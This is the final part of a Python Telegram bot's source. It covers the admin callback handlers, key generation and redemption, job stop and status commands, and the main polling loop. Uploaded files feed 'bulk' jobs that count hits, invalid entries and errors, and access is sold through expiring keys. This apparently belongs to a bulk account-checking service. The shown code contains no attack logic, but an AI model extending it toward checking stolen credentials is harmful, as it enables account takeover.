                        ev = active_jobs[target].get("stop_event")
                        if ev: ev.set()
                await safe_edit(q, "🛑 Stopped.", reply_markup=kb_back(is_admin))
            return

        if data == "open_admin":
            if uid != OWNER_ID:
                await q.answer("Admin only", show_alert=True); return
            await safe_edit(q, f"◇ *ADMIN PANEL* ◇\n{LINE_HEAVY}", reply_markup=kb_admin()); return

        if data == "adm_running":
            if uid != OWNER_ID: return
            with job_lock:
                running = [(k, dict(v)) for k, v in active_jobs.items()
                           if v.get("status") == "running" and "stats" in v]
            if not running:
                await safe_edit(q, "No active jobs.", reply_markup=kb_back(True)); return
            lines = [f"⚡ *RUNNING JOBS*\n{LINE_HEAVY}"]
            for r_uid, rj in running:
                s = rj["stats"].snapshot()
                mode = rj.get("mode", "bulk")
                lines.append(f"`{r_uid}` [{mode}] — ✅{s['hits']} 🚫{s['invalid']} ❌{s['errors']} ({s['checked']}/{s['total']})")
            await safe_edit(q, "\n".join(lines), reply_markup=kb_back(True)); return

        if data == "adm_stats":
            if uid != OWNER_ID: return
            await cmd_stats(update, ctx); return

        if data == "adm_users":
            if uid != OWNER_ID: return
            users = await user_manager.get_all_users()
            lines = [f"👥 *Users ({len(users)})*", LINE_HEAVY]
            for u, i in list(users.items())[:30]:
                lines.append(f"`{u}` | exp={(i.get('key_expiry') or '—')[:10]}")
            await safe_edit(q, "\n".join(lines), reply_markup=kb_back(True)); return

        if data == "adm_genkey":
            if uid != OWNER_ID: return
            await safe_edit(q, "Use `/genkey hours 24 1`", reply_markup=kb_back(True)); return

        await safe_edit(q, f"⚠️ Unknown action: `{data}`", reply_markup=kb_back(is_admin))

    except Exception:
        try: await q.answer("Error.", show_alert=True)
        except Exception: pass

# ────────────────────────────────────────────────────────────────
# POST_INIT + MAIN
# ────────────────────────────────────────────────────────────────

async def post_init(app):
    cmds = [
        BotCommand("start", "Dashboard"),
        BotCommand("redeem", "Redeem key"),
        BotCommand("stop", "Stop current job"),
        BotCommand("status", "Job status"),
        BotCommand("help", "Help"),
    ]
    await app.bot.set_my_commands(cmds)
    if OWNER_ID:
        await app.bot.set_my_commands(cmds + [
            BotCommand("admin", "Admin panel"),
            BotCommand("genkey", "Generate key"),
            BotCommand("ban_user", "Ban user"),
            BotCommand("unban_user", "Unban user"),
            BotCommand("stats", "Statistics"),
        ], scope={"type": "chat", "chat_id": OWNER_ID})

def main():
    req = HTTPXRequest(connect_timeout=TELEGRAM_CONNECT_TIMEOUT, read_timeout=TELEGRAM_READ_TIMEOUT,
                      write_timeout=TELEGRAM_WRITE_TIMEOUT, pool_timeout=TELEGRAM_POOL_TIMEOUT)
    app = Application.builder().token(BOT_TOKEN).request(req).post_init(post_init).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("ban_user", cmd_ban_user))
    app.add_handler(CommandHandler("unban_user", cmd_unban_user))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(handle_callback))

    try:
        app.run_polling(bootstrap_retries=10, allowed_updates=Update.ALL_TYPES,
                        drop_pending_updates=False)
    except NetworkError:
        time.sleep(5); main()
    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()